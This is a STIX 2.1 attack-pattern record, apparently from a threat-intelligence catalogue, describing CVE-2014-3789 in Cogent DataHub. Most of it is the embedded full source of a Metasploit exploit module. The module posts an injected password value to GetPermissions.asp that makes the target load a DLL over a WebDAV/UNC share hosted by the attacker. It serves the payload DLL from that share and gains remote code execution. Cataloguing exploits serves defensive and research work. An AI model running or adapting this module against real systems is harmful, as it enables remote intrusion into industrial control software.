{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--547533de-22dd-4fe9-9678-ee5d8e3865ea",
    "created": "2024-08-14T16:55:40.109796Z",
    "modified": "2024-08-14T16:55:40.1098Z",
    "name": "Cogent DataHub Command Injection",
    "description": " This module exploits an injection vulnerability in Cogent DataHub prior to 7.3.5. The vulnerability exists in the GetPermissions.asp page, which makes insecure use of the datahub_command function with user controlled data, allowing execution of arbitrary datahub commands and scripts. This module has been tested successfully with Cogent DataHub 7.3.4 on Windows 7 SP1. Please also note that after exploitation, the remote service will most likely hang and restart manually. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/cogent_datahub_command.rb",
            "external_id": "cogent_datahub_command.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-3789"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  # Exploitation is reliable, but the service hangs and needs manual restarting.\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize\n    super(\n      'Name'        \t=> 'Cogent DataHub Command Injection',\n      'Description'   => %q{\n        This module exploits an injection vulnerability in Cogent DataHub prior\n        to 7.3.5. The vulnerability exists in the GetPermissions.asp page, which\n        makes insecure use of the datahub_command function with user controlled\n        data, allowing execution of arbitrary datahub commands and scripts. This\n        module has been tested successfully with Cogent DataHub 7.3.4 on\n        Windows 7 SP1. Please also note that after exploitation, the remote service\n        will most likely hang and restart manually.\n      },\n      'Author'      => [\n        'John Leitch', # Vulnerability discovery\n        'juan vazquez' # Metasploit module\n      ],\n      'Platform'    => 'win',\n      'References'  =>\n        [\n          ['ZDI', '14-136'],\n          ['CVE', '2014-3789'],\n          ['BID', '67486']\n        ],\n      'Stance'      => Msf::Exploit::Stance::Aggressive,\n      'DefaultOptions' => {\n        'WfsDelay' => 30,\n        'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n      },\n      'Targets'     =>\n        [\n          [ 'Cogent DataHub < 7.3.5', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => 'Apr 29 2014'\n    )\n    register_options(\n      [\n        OptString.new('URIPATH',   [ true,  'The URI to use (do not change)', '/']),\n        OptPort.new('SRVPORT',     [ true,  'The daemon port to listen on ' +\n                                                      '(do not change)', 80 ]),\n        OptInt.new('WEBDAV_DELAY', [ true,  'Time that the HTTP Server will ' +\n                                          'wait for the payload request', 20]),\n        OptString.new('UNCPATH',   [ false, 'Override the UNC path to use.' ])\n      ])\n  end\n\n  def autofilter\n    false\n  end\n\n  def on_request_uri(cli, request)\n    case request.method\n      when 'OPTIONS'\n        process_options(cli, request)\n      when 'PROPFIND'\n        process_propfind(cli, request)\n      when 'GET'\n        process_get(cli, request)\n      else\n        vprint_status(\"#{request.method} => 404 (#{request.uri})\")\n        resp = create_response(404, \"Not Found\")\n        resp.body = \"\"\n        resp['Content-Type'] = 'text/html'\n        cli.send_response(resp)\n    end\n  end\n\n  def process_get(cli, request)\n\n    if blacklisted_path?(request.uri)\n      vprint_status(\"GET => 404 [BLACKLIST] (#{request.uri})\")\n      resp = create_response(404, \"Not Found\")\n      resp.body = \"\"\n      cli.send_response(resp)\n      return\n    end\n\n    if request.uri.include?(@basename)\n      print_status(\"GET => Payload\")\n      return if ((p = regenerate_payload(cli)) == nil)\n      data = generate_payload_dll({ :code => p.encoded })\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    # Treat index.html specially\n    if (request.uri[-1,1] == \"/\" or request.uri =~ /index\\.html?$/i)\n      vprint_status(\"GET => REDIRECT (#{request.uri})\")\n      resp = create_response(200, \"OK\")\n\n      resp.body  = %Q|<html><head><meta http-equiv=\"refresh\" content=\"0;URL=|\n      resp.body += %Q|#{@exploit_unc}#{@share_name}\\\\\"></head><body></body></html>|\n      resp['Content-Type'] = 'text/html'\n      cli.send_response(resp)\n      return\n    end\n\n    # Anything else is probably a request for a data file...\n    vprint_status(\"GET => DATA (#{request.uri})\")\n    data = rand_text_alpha(4 + rand(4))\n    send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n  end\n\n  #\n  # OPTIONS requests sent by the WebDav Mini-Redirector\n  #\n  def process_options(cli, request)\n    vprint_status(\"OPTIONS #{request.uri}\")\n    headers = {\n      'MS-Author-Via' => 'DAV',\n      'DASL'          => '<DAV:sql>',\n      'DAV'           => '1, 2',\n      'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY,' +\n                    + ' MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',\n      'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, ' +\n                    + 'LOCK, UNLOCK',\n      'Cache-Control' => 'private'\n    }\n    resp = create_response(207, \"Multi-Status\")\n    headers.each_pair {|k,v| resp[k] = v }\n    resp.body = \"\"\n    resp['Content-Type'] = 'text/xml'\n    cli.send_response(resp)\n  end\n\n  #\n  # PROPFIND requests sent by the WebDav Mini-Redirector\n  #\n  def process_propfind(cli, request)\n    path = request.uri\n    vprint_status(\"PROPFIND #{path}\")\n\n    if path !~ /\\/$/\n\n      if blacklisted_path?(path)\n        vprint_status \"PROPFIND => 404 (#{path})\"\n        resp = create_response(404, \"Not Found\")\n        resp.body = \"\"\n        cli.send_response(resp)\n        return\n      end\n\n      if path.index(\".\")\n        vprint_status \"PROPFIND => 207 File (#{path})\"\n        body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\" xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>\n<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<lp2:executable>T</lp2:executable>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>application/octet-stream</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n        # send the response\n        resp = create_response(207, \"Multi-Status\")\n        resp.body = body\n        resp['Content-Type'] = 'text/xml; charset=\"utf8\"'\n        cli.send_response(resp)\n        return\n      else\n        vprint_status \"PROPFIND => 301 (#{path})\"\n        resp = create_response(301, \"Moved\")\n        resp[\"Location\"] = path + \"/\"\n        resp['Content-Type'] = 'text/html'\n        cli.send_response(resp)\n        return\n      end\n    end\n\n    vprint_status \"PROPFIND => 207 Directory (#{path})\"\n    body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\" xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\">\n  <D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n    <D:href>#{path}</D:href>\n    <D:propstat>\n      <D:prop>\n        <lp1:resourcetype><D:collection/></lp1:resourcetype>\n        <lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n        <lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n        <lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n        <D:supportedlock>\n          <D:lockentry>\n            <D:lockscope><D:exclusive/></D:lockscope>\n            <D:locktype><D:write/></D:locktype>\n          </D:lockentry>\n          <D:lockentry>\n            <D:lockscope><D:shared/></D:lockscope>\n            <D:locktype><D:write/></D:locktype>\n          </D:lockentry>\n        </D:supportedlock>\n        <D:lockdiscovery/>\n        <D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n      </D:prop>\n    <D:status>HTTP/1.1 200 OK</D:status>\n  </D:propstat>\n</D:response>\n|\n\n    if request[\"Depth\"].to_i > 0\n      trail = path.split(\"/\")\n      trail.shift\n      case trail.length\n        when 0\n          body << generate_shares(path)\n        when 1\n          body << generate_files(path)\n      end\n    else\n      vprint_status \"PROPFIND => 207 Top-Level Directory\"\n    end\n\n    body << \"</D:multistatus>\"\n\n    body.gsub!(/\\t/, '')\n\n    # send the response\n    resp = create_response(207, \"Multi-Status\")\n    resp.body = body\n    resp['Content-Type'] = 'text/xml; charset=\"utf8\"'\n    cli.send_response(resp)\n  end\n\n  def generate_shares(path)\n    share_name = @share_name\n    %Q|\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}#{share_name}/</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype><D:collection/></lp1:resourcetype>\n<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n|\n  end\n\n  def generate_files(path)\n    trail = path.split(\"/\")\n    return \"\" if trail.length < 2\n\n    base  = @basename\n    exts  = @extensions.gsub(\",\", \" \").split(/\\s+/)\n    files = \"\"\n    exts.each do |ext|\n      files << %Q|\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}#{base}.#{ext}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n<lp1:getcontentlength>#{rand(0x10000)+120}</lp1:getcontentlength>\n<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<lp2:executable>T</lp2:executable>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>application/octet-stream</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n<D:ishidden b:dt=\"boolean\">1</D:ishidden>\n</D:propstat>\n</D:response>\n|\n    end\n\n    files\n  end\n\n  def gen_timestamp(ttype=nil)\n    ::Time.now.strftime(\"%a, %d %b %Y %H:%M:%S GMT\")\n  end\n\n  def gen_datestamp(ttype=nil)\n    ::Time.now.strftime(\"%Y-%m-%dT%H:%M:%SZ\")\n  end\n\n  # This method rejects requests that are known to break exploitation\n  def blacklisted_path?(uri)\n    share_path = \"/#{@share_name}\"\n    payload_path = \"#{share_path}/#{@basename}.dll\"\n    case uri\n      when payload_path\n        return false\n      when share_path\n        return false\n      else\n        return true\n    end\n  end\n\n  def check\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri('/', 'Silverlight', 'GetPermissions.asp'),\n      'vars_post' =>\n        {\n          'username' => rand_text_alpha(4 + rand(4)),\n          'password' => rand_text_alpha(4 + rand(4))\n        }\n      })\n\n    if res && res.code == 200 && res.body =~ /PermissionRecord/\n        return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def send_injection(dll)\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri('/', 'Silverlight', 'GetPermissions.asp'),\n      'vars_post' =>\n        {\n          'username' => rand_text_alpha(3 + rand(3)),\n          'password' => \"#{rand_text_alpha(3 + rand(3))}\\\")\" +\n                        \"(load_plugin \\\"#{dll}\\\" 1)(\\\"\"\n        }\n      }, 1)\n\n    res\n  end\n\n  def on_new_session(session)\n    if service\n      service.stop\n    end\n\n    super\n  end\n\n  def primer\n    print_status(\"Sending injection...\")\n    res = send_injection(\"\\\\\\\\\\\\\\\\#{@myhost}\\\\\\\\#{@share_name}\\\\\\\\#{@basename}.dll\")\n    if res\n      print_error(\"Unexpected answer\")\n    end\n  end\n\n  def exploit\n    if datastore['UNCPATH'].blank?\n      @basename = rand_text_alpha(3)\n      @share_name = rand_text_alpha(3)\n      @extensions = \"dll\"\n      @system_commands_file = rand_text_alpha_lower(4)\n\n      if (datastore['SRVHOST'] == '0.0.0.0')\n        @myhost = Rex::Socket.source_address('50.50.50.50')\n      else\n        @myhost = datastore['SRVHOST']\n      end\n\n      @exploit_unc  = \"\\\\\\\\#{@myhost}\\\\\"\n\n      if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'\n        fail_with(Failure::BadConfig, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')\n      end\n\n      print_status(\"Starting Shared resource at #{@exploit_unc}#{@share_name}\" +\n                    \"\\\\#{@basename}.dll\")\n\n      begin\n        # The Windows Webclient needs some time...\n        Timeout.timeout(datastore['WEBDAV_DELAY']) { super }\n      rescue ::Timeout::Error\n        service.stop if service\n      end\n    else\n      # Using external SMB Server\n      if datastore['UNCPATH'] =~ /\\\\\\\\([^\\\\]*)\\\\([^\\\\]*)\\\\([^\\\\]*\\.dll)/\n        host = $1\n        share_name = $2\n        dll_name = $3\n        print_status(\"Sending injection...\")\n        res = send_injection(\"\\\\\\\\\\\\\\\\#{host}\\\\\\\\#{share_name}\\\\\\\\#{dll_name}\")\n        if res\n          print_error(\"Unexpected answer\")\n        end\n      else\n        fail_with(Failure::BadConfig, 'Bad UNCPATH format, should be \\\\\\\\host\\\\shared_folder\\\\base_name.dll')\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "Apr 29 2014",
    "x_mitre_platforms": [
        "win'"
    ]
}